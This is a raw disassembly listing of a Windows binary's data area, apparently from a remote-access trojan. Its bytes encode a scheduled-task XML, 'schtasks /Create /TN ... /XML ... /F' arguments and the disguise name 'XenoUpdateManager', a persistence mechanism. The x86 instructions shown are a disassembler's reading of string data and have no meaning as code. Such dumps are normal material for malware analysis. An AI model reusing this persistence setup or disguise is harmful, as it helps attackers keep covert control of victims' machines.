  40c4f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c4f6:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40c4fc:	3e 00 66 00          	add    %ah,%ds:0x0(%esi)
  40c500:	61                   	popa
  40c501:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c505:	00 65 00             	add    %ah,0x0(%ebp)
  40c508:	3c 00                	cmp    $0x0,%al
  40c50a:	2f                   	das
  40c50b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40c50f:	00 73 00             	add    %dh,0x0(%ebx)
  40c512:	61                   	popa
  40c513:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c517:	00 6f 00             	add    %ch,0x0(%edi)
  40c51a:	77 00                	ja     0x40c51c
  40c51c:	53                   	push   %ebx
  40c51d:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40c521:	00 72 00             	add    %dh,0x0(%edx)
  40c524:	74 00                	je     0x40c526
  40c526:	49                   	dec    %ecx
  40c527:	00 66 00             	add    %ah,0x0(%esi)
  40c52a:	4f                   	dec    %edi
  40c52b:	00 6e 00             	add    %ch,0x0(%esi)
  40c52e:	42                   	inc    %edx
  40c52f:	00 61 00             	add    %ah,0x0(%ecx)
  40c532:	74 00                	je     0x40c534
  40c534:	74 00                	je     0x40c536
  40c536:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c53a:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40c540:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c543:	00 20                	add    %ah,(%eax)
  40c545:	00 20                	add    %ah,(%eax)
  40c547:	00 20                	add    %ah,(%eax)
  40c549:	00 20                	add    %ah,(%eax)
  40c54b:	00 20                	add    %ah,(%eax)
  40c54d:	00 20                	add    %ah,(%eax)
  40c54f:	00 20                	add    %ah,(%eax)
  40c551:	00 20                	add    %ah,(%eax)
  40c553:	00 20                	add    %ah,(%eax)
  40c555:	00 20                	add    %ah,(%eax)
  40c557:	00 20                	add    %ah,(%eax)
  40c559:	00 20                	add    %ah,(%eax)
  40c55b:	00 20                	add    %ah,(%eax)
  40c55d:	00 20                	add    %ah,(%eax)
  40c55f:	00 20                	add    %ah,(%eax)
  40c561:	00 20                	add    %ah,(%eax)
  40c563:	00 20                	add    %ah,(%eax)
  40c565:	00 20                	add    %ah,(%eax)
  40c567:	00 20                	add    %ah,(%eax)
  40c569:	00 20                	add    %ah,(%eax)
  40c56b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c56e:	4d                   	dec    %ebp
  40c56f:	00 75 00             	add    %dh,0x0(%ebp)
  40c572:	6c                   	insb   (%dx),%es:(%edi)
  40c573:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c577:	00 70 00             	add    %dh,0x0(%eax)
  40c57a:	6c                   	insb   (%dx),%es:(%edi)
  40c57b:	00 65 00             	add    %ah,0x0(%ebp)
  40c57e:	49                   	dec    %ecx
  40c57f:	00 6e 00             	add    %ch,0x0(%esi)
  40c582:	73 00                	jae    0x40c584
  40c584:	74 00                	je     0x40c586
  40c586:	61                   	popa
  40c587:	00 6e 00             	add    %ch,0x0(%esi)
  40c58a:	63 00                	arpl   %eax,(%eax)
  40c58c:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c590:	50                   	push   %eax
  40c591:	00 6f 00             	add    %ch,0x0(%edi)
  40c594:	6c                   	insb   (%dx),%es:(%edi)
  40c595:	00 69 00             	add    %ch,0x0(%ecx)
  40c598:	63 00                	arpl   %eax,(%eax)
  40c59a:	79 00                	jns    0x40c59c
  40c59c:	3e 00 50 00          	add    %dl,%ds:0x0(%eax)
  40c5a0:	61                   	popa
  40c5a1:	00 72 00             	add    %dh,0x0(%edx)
  40c5a4:	61                   	popa
  40c5a5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c5a9:	00 65 00             	add    %ah,0x0(%ebp)
  40c5ac:	6c                   	insb   (%dx),%es:(%edi)
  40c5ad:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c5b0:	2f                   	das
  40c5b1:	00 4d 00             	add    %cl,0x0(%ebp)
  40c5b4:	75 00                	jne    0x40c5b6
  40c5b6:	6c                   	insb   (%dx),%es:(%edi)
  40c5b7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c5bb:	00 70 00             	add    %dh,0x0(%eax)
  40c5be:	6c                   	insb   (%dx),%es:(%edi)
  40c5bf:	00 65 00             	add    %ah,0x0(%ebp)
  40c5c2:	49                   	dec    %ecx
  40c5c3:	00 6e 00             	add    %ch,0x0(%esi)
  40c5c6:	73 00                	jae    0x40c5c8
  40c5c8:	74 00                	je     0x40c5ca
  40c5ca:	61                   	popa
  40c5cb:	00 6e 00             	add    %ch,0x0(%esi)
  40c5ce:	63 00                	arpl   %eax,(%eax)
  40c5d0:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c5d4:	50                   	push   %eax
  40c5d5:	00 6f 00             	add    %ch,0x0(%edi)
  40c5d8:	6c                   	insb   (%dx),%es:(%edi)
  40c5d9:	00 69 00             	add    %ch,0x0(%ecx)
  40c5dc:	63 00                	arpl   %eax,(%eax)
  40c5de:	79 00                	jns    0x40c5e0
  40c5e0:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c5e3:	00 20                	add    %ah,(%eax)
  40c5e5:	00 20                	add    %ah,(%eax)
  40c5e7:	00 20                	add    %ah,(%eax)
  40c5e9:	00 20                	add    %ah,(%eax)
  40c5eb:	00 20                	add    %ah,(%eax)
  40c5ed:	00 20                	add    %ah,(%eax)
  40c5ef:	00 20                	add    %ah,(%eax)
  40c5f1:	00 20                	add    %ah,(%eax)
  40c5f3:	00 20                	add    %ah,(%eax)
  40c5f5:	00 20                	add    %ah,(%eax)
  40c5f7:	00 20                	add    %ah,(%eax)
  40c5f9:	00 20                	add    %ah,(%eax)
  40c5fb:	00 20                	add    %ah,(%eax)
  40c5fd:	00 20                	add    %ah,(%eax)
  40c5ff:	00 20                	add    %ah,(%eax)
  40c601:	00 20                	add    %ah,(%eax)
  40c603:	00 20                	add    %ah,(%eax)
  40c605:	00 20                	add    %ah,(%eax)
  40c607:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c60a:	2f                   	das
  40c60b:	00 53 00             	add    %dl,0x0(%ebx)
  40c60e:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  40c613:	00 69 00             	add    %ch,0x0(%ecx)
  40c616:	6e                   	outsb  %ds:(%esi),(%dx)
  40c617:	00 67 00             	add    %ah,0x0(%edi)
  40c61a:	73 00                	jae    0x40c61c
  40c61c:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c61f:	00 20                	add    %ah,(%eax)
  40c621:	00 20                	add    %ah,(%eax)
  40c623:	00 20                	add    %ah,(%eax)
  40c625:	00 20                	add    %ah,(%eax)
  40c627:	00 20                	add    %ah,(%eax)
  40c629:	00 20                	add    %ah,(%eax)
  40c62b:	00 20                	add    %ah,(%eax)
  40c62d:	00 20                	add    %ah,(%eax)
  40c62f:	00 20                	add    %ah,(%eax)
  40c631:	00 20                	add    %ah,(%eax)
  40c633:	00 20                	add    %ah,(%eax)
  40c635:	00 20                	add    %ah,(%eax)
  40c637:	00 20                	add    %ah,(%eax)
  40c639:	00 20                	add    %ah,(%eax)
  40c63b:	00 20                	add    %ah,(%eax)
  40c63d:	00 20                	add    %ah,(%eax)
  40c63f:	00 20                	add    %ah,(%eax)
  40c641:	00 20                	add    %ah,(%eax)
  40c643:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c646:	41                   	inc    %ecx
  40c647:	00 63 00             	add    %ah,0x0(%ebx)
  40c64a:	74 00                	je     0x40c64c
  40c64c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c652:	73 00                	jae    0x40c654
  40c654:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c657:	00 20                	add    %ah,(%eax)
  40c659:	00 20                	add    %ah,(%eax)
  40c65b:	00 20                	add    %ah,(%eax)
  40c65d:	00 20                	add    %ah,(%eax)
  40c65f:	00 20                	add    %ah,(%eax)
  40c661:	00 20                	add    %ah,(%eax)
  40c663:	00 20                	add    %ah,(%eax)
  40c665:	00 20                	add    %ah,(%eax)
  40c667:	00 20                	add    %ah,(%eax)
  40c669:	00 20                	add    %ah,(%eax)
  40c66b:	00 20                	add    %ah,(%eax)
  40c66d:	00 20                	add    %ah,(%eax)
  40c66f:	00 20                	add    %ah,(%eax)
  40c671:	00 20                	add    %ah,(%eax)
  40c673:	00 20                	add    %ah,(%eax)
  40c675:	00 20                	add    %ah,(%eax)
  40c677:	00 20                	add    %ah,(%eax)
  40c679:	00 20                	add    %ah,(%eax)
  40c67b:	00 20                	add    %ah,(%eax)
  40c67d:	00 20                	add    %ah,(%eax)
  40c67f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c682:	45                   	inc    %ebp
  40c683:	00 78 00             	add    %bh,0x0(%eax)
  40c686:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c68a:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c68d:	00 20                	add    %ah,(%eax)
  40c68f:	00 20                	add    %ah,(%eax)
  40c691:	00 20                	add    %ah,(%eax)
  40c693:	00 20                	add    %ah,(%eax)
  40c695:	00 20                	add    %ah,(%eax)
  40c697:	00 20                	add    %ah,(%eax)
  40c699:	00 20                	add    %ah,(%eax)
  40c69b:	00 20                	add    %ah,(%eax)
  40c69d:	00 20                	add    %ah,(%eax)
  40c69f:	00 20                	add    %ah,(%eax)
  40c6a1:	00 20                	add    %ah,(%eax)
  40c6a3:	00 20                	add    %ah,(%eax)
  40c6a5:	00 20                	add    %ah,(%eax)
  40c6a7:	00 20                	add    %ah,(%eax)
  40c6a9:	00 20                	add    %ah,(%eax)
  40c6ab:	00 20                	add    %ah,(%eax)
  40c6ad:	00 20                	add    %ah,(%eax)
  40c6af:	00 20                	add    %ah,(%eax)
  40c6b1:	00 20                	add    %ah,(%eax)
  40c6b3:	00 20                	add    %ah,(%eax)
  40c6b5:	00 20                	add    %ah,(%eax)
  40c6b7:	00 20                	add    %ah,(%eax)
  40c6b9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c6bc:	43                   	inc    %ebx
  40c6bd:	00 6f 00             	add    %ch,0x0(%edi)
  40c6c0:	6d                   	insl   (%dx),%es:(%edi)
  40c6c1:	00 6d 00             	add    %ch,0x0(%ebp)
  40c6c4:	61                   	popa
  40c6c5:	00 6e 00             	add    %ch,0x0(%esi)
  40c6c8:	64 00 3e             	add    %bh,%fs:(%esi)
  40c6cb:	00 01                	add    %al,(%ecx)
  40c6cd:	80 b7 3c 00 2f 00 43 	xorb   $0x43,0x2f003c(%edi)
  40c6d4:	00 6f 00             	add    %ch,0x0(%edi)
  40c6d7:	6d                   	insl   (%dx),%es:(%edi)
  40c6d8:	00 6d 00             	add    %ch,0x0(%ebp)
  40c6db:	61                   	popa
  40c6dc:	00 6e 00             	add    %ch,0x0(%esi)
  40c6df:	64 00 3e             	add    %bh,%fs:(%esi)
  40c6e2:	00 0a                	add    %cl,(%edx)
  40c6e4:	00 20                	add    %ah,(%eax)
  40c6e6:	00 20                	add    %ah,(%eax)
  40c6e8:	00 20                	add    %ah,(%eax)
  40c6ea:	00 20                	add    %ah,(%eax)
  40c6ec:	00 20                	add    %ah,(%eax)
  40c6ee:	00 20                	add    %ah,(%eax)
  40c6f0:	00 20                	add    %ah,(%eax)
  40c6f2:	00 20                	add    %ah,(%eax)
  40c6f4:	00 20                	add    %ah,(%eax)
  40c6f6:	00 20                	add    %ah,(%eax)
  40c6f8:	00 20                	add    %ah,(%eax)
  40c6fa:	00 20                	add    %ah,(%eax)
  40c6fc:	00 20                	add    %ah,(%eax)
  40c6fe:	00 20                	add    %ah,(%eax)
  40c700:	00 20                	add    %ah,(%eax)
  40c702:	00 20                	add    %ah,(%eax)
  40c704:	00 20                	add    %ah,(%eax)
  40c706:	00 20                	add    %ah,(%eax)
  40c708:	00 20                	add    %ah,(%eax)
  40c70a:	00 20                	add    %ah,(%eax)
  40c70c:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c70f:	2f                   	das
  40c710:	00 45 00             	add    %al,0x0(%ebp)
  40c713:	78 00                	js     0x40c715
  40c715:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c719:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c71c:	00 20                	add    %ah,(%eax)
  40c71e:	00 20                	add    %ah,(%eax)
  40c720:	00 20                	add    %ah,(%eax)
  40c722:	00 20                	add    %ah,(%eax)
  40c724:	00 20                	add    %ah,(%eax)
  40c726:	00 20                	add    %ah,(%eax)
  40c728:	00 20                	add    %ah,(%eax)
  40c72a:	00 20                	add    %ah,(%eax)
  40c72c:	00 20                	add    %ah,(%eax)
  40c72e:	00 20                	add    %ah,(%eax)
  40c730:	00 20                	add    %ah,(%eax)
  40c732:	00 20                	add    %ah,(%eax)
  40c734:	00 20                	add    %ah,(%eax)
  40c736:	00 20                	add    %ah,(%eax)
  40c738:	00 20                	add    %ah,(%eax)
  40c73a:	00 20                	add    %ah,(%eax)
  40c73c:	00 20                	add    %ah,(%eax)
  40c73e:	00 20                	add    %ah,(%eax)
  40c740:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c743:	2f                   	das
  40c744:	00 41 00             	add    %al,0x0(%ecx)
  40c747:	63 00                	arpl   %eax,(%eax)
  40c749:	74 00                	je     0x40c74b
  40c74b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c751:	73 00                	jae    0x40c753
  40c753:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c756:	00 20                	add    %ah,(%eax)
  40c758:	00 20                	add    %ah,(%eax)
  40c75a:	00 20                	add    %ah,(%eax)
  40c75c:	00 20                	add    %ah,(%eax)
  40c75e:	00 20                	add    %ah,(%eax)
  40c760:	00 20                	add    %ah,(%eax)
  40c762:	00 20                	add    %ah,(%eax)
  40c764:	00 20                	add    %ah,(%eax)
  40c766:	00 20                	add    %ah,(%eax)
  40c768:	00 20                	add    %ah,(%eax)
  40c76a:	00 20                	add    %ah,(%eax)
  40c76c:	00 20                	add    %ah,(%eax)
  40c76e:	00 20                	add    %ah,(%eax)
  40c770:	00 20                	add    %ah,(%eax)
  40c772:	00 20                	add    %ah,(%eax)
  40c774:	00 20                	add    %ah,(%eax)
  40c776:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c779:	2f                   	das
  40c77a:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40c77e:	00 73 00             	add    %dh,0x0(%ebx)
  40c781:	6b 00 3e             	imul   $0x3e,(%eax),%eax
  40c784:	00 00                	add    %al,(%eax)
  40c786:	1b 2f                	sbb    (%edi),%ebp
  40c788:	00 43 00             	add    %al,0x0(%ebx)
  40c78b:	72 00                	jb     0x40c78d
  40c78d:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c791:	74 00                	je     0x40c793
  40c793:	65 00 20             	add    %ah,%gs:(%eax)
  40c796:	00 2f                	add    %ch,(%edi)
  40c798:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40c79c:	00 20                	add    %ah,(%eax)
  40c79e:	00 22                	add    %ah,(%edx)
  40c7a0:	00 00                	add    %al,(%eax)
  40c7a2:	11 22                	adc    %esp,(%edx)
  40c7a4:	00 20                	add    %ah,(%eax)
  40c7a6:	00 2f                	add    %ch,(%edi)
  40c7a8:	00 58 00             	add    %bl,0x0(%eax)
  40c7ab:	4d                   	dec    %ebp
  40c7ac:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c7b0:	00 22                	add    %ah,(%edx)
  40c7b2:	00 00                	add    %al,(%eax)
  40c7b4:	09 22                	or     %esp,(%edx)
  40c7b6:	00 20                	add    %ah,(%eax)
  40c7b8:	00 2f                	add    %ch,(%edi)
  40c7ba:	00 46 00             	add    %al,0x0(%esi)
  40c7bd:	00 0f                	add    %cl,(%edi)
  40c7bf:	53                   	push   %ebx
  40c7c0:	00 55 00             	add    %dl,0x0(%ebp)
  40c7c3:	43                   	inc    %ebx
  40c7c4:	00 43 00             	add    %al,0x0(%ebx)
  40c7c7:	45                   	inc    %ebp
  40c7c8:	00 53 00             	add    %dl,0x0(%ebx)
  40c7cb:	53                   	push   %ebx
  40c7cc:	00 00                	add    %al,(%eax)
  40c7ce:	00 00                	add    %al,(%eax)
  40c7d0:	14 53                	adc    $0x53,%al
  40c7d2:	b9 d8 d7 17 08       	mov    $0x817d7d8,%ecx
  40c7d7:	43                   	inc    %ebx
  40c7d8:	84 3f                	test   %bh,(%edi)
  40c7da:	f6 b5 fa 30 d4 86    	divb   -0x792bcf06(%ebp)
  40c7e0:	00 08                	add    %cl,(%eax)
  40c7e2:	b7 7a                	mov    $0x7a,%bh
  40c7e4:	5c                   	pop    %esp
  40c7e5:	56                   	push   %esi
  40c7e6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c7e9:	89 02                	mov    %eax,(%edx)
  40c7eb:	06                   	push   %es
  40c7ec:	07                   	pop    %es
  40c7ed:	02 02                	add    (%edx),%al
  40c7ef:	00 02                	add    %al,(%edx)
  40c7f1:	00 01                	add    %al,(%ecx)
  40c7f3:	08 00                	or     %al,(%eax)
  40c7f5:	03 09                	add    (%ecx),%ecx
  40c7f7:	07                   	pop    %es
  40c7f8:	10 09                	adc    %cl,(%ecx)
  40c7fa:	10 09                	adc    %cl,(%ecx)
  40c7fc:	0c 00                	or     $0x0,%al
  40c7fe:	06                   	push   %es
  40c7ff:	09 07                	or     %eax,(%edi)
  40c801:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40c806:	08 10                	or     %dl,(%eax)
  40c808:	08 0e                	or     %cl,(%esi)
  40c80a:	00 08                	add    %cl,(%eax)
  40c80c:	09 07                	or     %eax,(%edi)
  40c80e:	1d 05 08 1d 05       	sbb    $0x51d0805,%eax
  40c813:	08 09                	or     %cl,(%ecx)
  40c815:	10 08                	adc    %cl,(%eax)
  40c817:	18 05 00 02 18 08    	sbb    %al,0x8180200
  40c81d:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40c820:	01 18                	add    %ebx,(%eax)
  40c822:	18 06                	sbb    %al,(%esi)
  40c824:	00 01                	add    %al,(%ecx)
  40c826:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c82b:	00 02                	add    %al,(%edx)
  40c82d:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40c832:	03 20                	add    (%eax),%esp
  40c834:	00 01                	add    %al,(%ecx)
  40c836:	08 06                	or     %al,(%esi)
  40c838:	15 12 09 02 0e       	adc    $0xe020912,%eax
  40c83d:	12 0d 02 06 0e 06    	adc    0x60e0602,%cl
  40c843:	20 01                	and    %al,(%ecx)
  40c845:	12 11                	adc    (%ecx),%dl
  40c847:	12 3c 07             	adc    (%edi,%eax,1),%bh
  40c84a:	00 02                	add    %al,(%edx)
  40c84c:	12 0d 1c 12 15 02    	adc    0x215121c,%cl
  40c852:	06                   	push   %es
  40c853:	08 03                	or     %al,(%ebx)
  40c855:	06                   	push   %es
  40c856:	11 21                	adc    %esp,(%ecx)
  40c858:	03 06                	add    (%esi),%eax
  40c85a:	12 3c 03             	adc    (%ebx,%eax,1),%bh
  40c85d:	06                   	push   %es
  40c85e:	12 0c 03             	adc    (%ebx,%eax,1),%cl
  40c861:	06                   	push   %es
  40c862:	1d 05 02 06 1c       	sbb    $0x1c060205,%eax
  40c867:	07                   	pop    %es
  40c868:	06                   	push   %es
  40c869:	15 11 25 01 1d       	adc    $0x1d012511,%eax
  40c86e:	05 06 06 15 11       	add    $0x11150606,%eax
  40c873:	25 01 02 03 06       	and    $0x6030201,%eax
  40c878:	11 29                	adc    %ebp,(%ecx)
  40c87a:	03 06                	add    (%esi),%eax
  40c87c:	12 2d 05 20 01 01    	adc    0x1012005,%ch
  40c882:	12 1d 08 00 02 1d    	adc    0x1d020008,%bl
  40c888:	05 1d 05 1d 05       	add    $0x51d051d,%eax
  40c88d:	07                   	pop    %es
  40c88e:	20 02                	and    %al,(%edx)
  40c890:	01 12                	add    %edx,(%edx)
  40c892:	3c 12                	cmp    $0x12,%al
  40c894:	0c 06                	or     $0x6,%al
  40c896:	20 01                	and    %al,(%ecx)
  40c898:	12 11                	adc    (%ecx),%dl
  40c89a:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  40c89f:	01 12                	add    %edx,(%edx)
  40c8a1:	3c 04                	cmp    $0x4,%al
  40c8a3:	20 00                	and    %al,(%eax)
  40c8a5:	12 11                	adc    (%ecx),%dl
  40c8a7:	08 20                	or     %ah,(%eax)
  40c8a9:	02 12                	add    (%edx),%dl
  40c8ab:	11 12                	adc    %edx,(%edx)
  40c8ad:	3c 1d                	cmp    $0x1d,%al
  40c8af:	05 03 06 12 18       	add    $0x18120603,%eax
  40c8b4:	07                   	pop    %es
  40c8b5:	06                   	push   %es
  40c8b6:	15 11 25 01 12       	adc    $0x12012511,%eax
  40c8bb:	3c 06                	cmp    $0x6,%al
  40c8bd:	06                   	push   %es
  40c8be:	15 11 25 01 0e       	adc    $0xe012511,%eax
  40c8c3:	06                   	push   %es
  40c8c4:	06                   	push   %es
  40c8c5:	15 11 25 01 09       	adc    $0x9012511,%eax
  40c8ca:	07                   	pop    %es
  40c8cb:	06                   	push   %es
  40c8cc:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c8d1:	3c 07                	cmp    $0x7,%al
  40c8d3:	06                   	push   %es
  40c8d4:	15 12 35 01 12       	adc    $0x12013512,%eax
  40c8d9:	3c 03                	cmp    $0x3,%al
  40c8db:	06                   	push   %es
  40c8dc:	12 58 08             	adc    0x8(%eax),%bl
  40c8df:	00 03                	add    %al,(%ebx)
  40c8e1:	08 1d 05 1d 05 0a    	or     %bl,0xa051d05
  40c8e7:	0b 20                	or     (%eax),%esp
  40c8e9:	02 01                	add    (%ecx),%al
  40c8eb:	12 58 15             	adc    0x15(%eax),%bl
  40c8ee:	12 31                	adc    (%ecx),%dh
  40c8f0:	01 12                	add    %edx,(%edx)
  40c8f2:	3c 10                	cmp    $0x10,%al
  40c8f4:	20 03                	and    %al,(%ebx)
  40c8f6:	15 12 39 01 12       	adc    $0x12013912,%eax
  40c8fb:	3c 08                	cmp    $0x8,%al
  40c8fd:	08 15 12 31 01 12    	or     %dl,0x12013112
  40c903:	3c 04                	cmp    $0x4,%al
  40c905:	00 00                	add    %al,(%eax)
  40c907:	00 00                	add    %al,(%eax)
  40c909:	03 20                	add    (%eax),%esp
  40c90b:	00 02                	add    %al,(%edx)
  40c90d:	08 20                	or     %ah,(%eax)
  40c90f:	00 15 12 39 01 1d    	add    %dl,0x1d013912
  40c915:	05 09 20 01 15       	add    $0x15012009,%eax
  40c91a:	12 39                	adc    (%ecx),%bh
  40c91c:	01 02                	add    %eax,(%edx)
  40c91e:	1d 05 07 20 02       	sbb    $0x2200705,%eax
  40c923:	02 1d 05 1d 05 04    	add    0x4051d05,%bl
  40c929:	20 01                	and    %al,(%ecx)
  40c92b:	01 08                	add    %ecx,(%eax)
  40c92d:	09 20                	or     %esp,(%eax)
  40c92f:	02 15 12 39 01 02    	add    0x2013912,%dl
  40c935:	08 08                	or     %cl,(%eax)
  40c937:	03 06                	add    (%esi),%eax
  40c939:	11 3d 07 06 15 11    	adc    %edi,0x11150607
  40c93f:	41                   	inc    %ecx
  40c940:	01 12                	add    %edx,(%edx)
  40c942:	3c 03                	cmp    $0x3,%al
  40c944:	06                   	push   %es
  40c945:	12 45 07             	adc    0x7(%ebp),%al
  40c948:	06                   	push   %es
  40c949:	15 11 41 01 1d       	adc    $0x1d014111,%eax
  40c94e:	05 06 06 15 11       	add    $0x11150606,%eax
  40c953:	41                   	inc    %ecx
  40c954:	01 02                	add    %eax,(%edx)
  40c956:	02 06                	add    (%esi),%al
  40c958:	02 07                	add    (%edi),%al
  40c95a:	20 02                	and    %al,(%edx)
  40c95c:	01 12                	add    %edx,(%edx)
  40c95e:	45                   	inc    %ebp
  40c95f:	1d 05 09 20 01       	sbb    $0x1200905,%eax
  40c964:	15 12 39 01 1d       	adc    $0x1d013912,%eax
  40c969:	05 08 06 20 01       	add    $0x1200608,%eax
  40c96e:	12 54 1d 05          	adc    0x5(%ebp,%ebx,1),%dl
  40c972:	07                   	pop    %es
  40c973:	20 02                	and    %al,(%edx)
  40c975:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40c97a:	06                   	push   %es
  40c97b:	20 02                	and    %al,(%edx)
  40c97d:	08 1d 05 08 05 20    	or     %bl,0x20050805
  40c983:	01 1d 05 08 06 06    	add    %ebx,0x6060805
  40c989:	15 11 25 01 08       	adc    $0x8012511,%eax
  40c98e:	03 06                	add    (%esi),%eax
  40c990:	11 49 03             	adc    %ecx,0x3(%ecx)
  40c993:	06                   	push   %es
  40c994:	12 64 0c 06          	adc    0x6(%esp,%ecx,1),%ah
  40c998:	15 12 4d 02 1d       	adc    $0x1d024d12,%eax
  40c99d:	05 15 12 51 01       	add    $0x1511215,%eax
  40c9a2:	05 03 00 00 01       	add    $0x1000003,%eax
  40c9a7:	09 20                	or     %esp,(%eax)
  40c9a9:	01 15 12 51 01 05    	add    %edx,0x5015112
  40c9af:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40c9b4:	55                   	push   %ebp
  40c9b5:	06                   	push   %es
  40c9b6:	00 01                	add    %al,(%ecx)
  40c9b8:	12 11                	adc    (%ecx),%dl
  40c9ba:	1d 0e 05 00 01       	sbb    $0x100050e,%eax
  40c9bf:	01 12                	add    %edx,(%edx)
  40c9c1:	3c 06                	cmp    $0x6,%al
  40c9c3:	00 02                	add    %al,(%edx)
  40c9c5:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c9c8:	59                   	pop    %ecx
  40c9c9:	05 00 01 01 1d       	add    $0x1d010100,%eax
  40c9ce:	0e                   	push   %cs
  40c9cf:	03 06                	add    (%esi),%eax
  40c9d1:	12 5d 05             	adc    0x5(%ebp),%bl
  40c9d4:	20 01                	and    %al,(%ecx)
  40c9d6:	01 12                	add    %edx,(%edx)
  40c9d8:	5d                   	pop    %ebp
  40c9d9:	04 20                	add    $0x20,%al
  40c9db:	00 12                	add    %dl,(%edx)
  40c9dd:	61                   	popa
  40c9de:	04 20                	add    $0x20,%al
  40c9e0:	01 01                	add    %eax,(%ecx)
  40c9e2:	03 04 20             	add    (%eax,%eiz,1),%eax
  40c9e5:	01 01                	add    %eax,(%ecx)
  40c9e7:	0e                   	push   %cs
  40c9e8:	03 20                	add    (%eax),%esp
  40c9ea:	00 0e                	add    %cl,(%esi)
  40c9ec:	04 28                	add    $0x28,%al
  40c9ee:	00 12                	add    %dl,(%edx)
  40c9f0:	61                   	popa
  40c9f1:	03 00                	add    (%eax),%eax
  40c9f3:	00 02                	add    %al,(%edx)
  40c9f5:	01 02                	add    %eax,(%edx)
  40c9f7:	03 00                	add    (%eax),%eax
  40c9f9:	00 18                	add    %bl,(%eax)
  40c9fb:	07                   	pop    %es
  40c9fc:	00 03                	add    %al,(%ebx)
  40c9fe:	08 18                	or     %bl,(%eax)
  40ca00:	12 55 08             	adc    0x8(%ebp),%dl
  40ca03:	04 00                	add    $0x0,%al
  40ca05:	01 08                	add    %ecx,(%eax)
  40ca07:	18 06                	sbb    %al,(%esi)
  40ca09:	00 02                	add    %al,(%edx)
  40ca0b:	18 18                	sbb    %bl,(%eax)
  40ca0d:	10 09                	adc    %cl,(%ecx)
  40ca0f:	07                   	pop    %es
  40ca10:	00 01                	add    %al,(%ecx)
  40ca12:	02 10                	add    (%eax),%dl
  40ca14:	11 80 80 04 00 01    	adc    %eax,0x1000480(%eax)
  40ca1a:	02 18                	add    (%eax),%bl
  40ca1c:	07                   	pop    %es
  40ca1d:	00 00                	add    %al,(%eax)
  40ca1f:	15 12 39 01 0e       	adc    $0xe013912,%eax
  40ca24:	03 00                	add    (%eax),%eax
  40ca26:	00 0e                	add    %cl,(%esi)
  40ca28:	04 00                	add    $0x0,%al
  40ca2a:	01 0e                	add    %ecx,(%esi)
  40ca2c:	0e                   	push   %cs
  40ca2d:	14 00                	adc    $0x0,%al
  40ca2f:	05 15 12 39 01       	add    $0x1391215,%eax
  40ca34:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40ca37:	45                   	inc    %ebp
  40ca38:	1d 05 08 08 15       	sbb    $0x15080805,%eax
  40ca3d:	12 31                	adc    (%ecx),%dh
  40ca3f:	01 12                	add    %edx,(%edx)
  40ca41:	3c 05                	cmp    $0x5,%al
  40ca43:	00 01                	add    %al,(%ecx)
  40ca45:	12 11                	adc    (%ecx),%dl
  40ca47:	0e                   	push   %cs
  40ca48:	04 00                	add    $0x0,%al
  40ca4a:	00 12                	add    %dl,(%edx)
  40ca4c:	11 09                	adc    %ecx,(%ecx)
  40ca4e:	00 02                	add    %al,(%edx)
  40ca50:	15 12 39 01 02       	adc    $0x2013912,%eax
  40ca55:	0e                   	push   %cs
  40ca56:	0e                   	push   %cs
  40ca57:	22 58 00             	and    0x0(%eax),%bl
  40ca5a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40ca5e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ca5f:	00 55 00             	add    %dl,0x0(%ebp)
  40ca62:	70 00                	jo     0x40ca64
  40ca64:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40ca68:	74 00                	je     0x40ca6a
  40ca6a:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40ca6e:	61                   	popa
  40ca6f:	00 6e 00             	add    %ch,0x0(%esi)
  40ca72:	61                   	popa
